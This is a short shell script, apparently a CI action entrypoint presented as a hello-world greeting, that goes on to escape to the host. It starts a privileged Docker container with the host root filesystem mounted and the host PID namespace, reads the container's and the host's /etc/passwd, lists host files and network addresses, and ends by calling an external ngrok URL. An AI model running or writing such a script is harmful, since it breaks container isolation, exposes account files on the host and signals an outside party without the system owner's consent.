#!/bin/sh -l

sh -c "echo Hello world my name is $MY_NAME"
which docker
docker ps
echo "\n\nIn the container"
whoami
cat /etc/passwd
echo "\n\nOn the host"
docker run --privileged --rm --pid=host -t -d -v /:/host --name dddd debian
docker ps
echo "\n User on host"
docker exec dddd whoami
echo "\n Host filesystem"
docker exec dddd ls /host
echo "\n Host /etc/passwd"
docker exec dddd cat /host/etc/passwd
docker exec dddd ip addr
docker exec dddd curl http://746f1030.ngrok.io
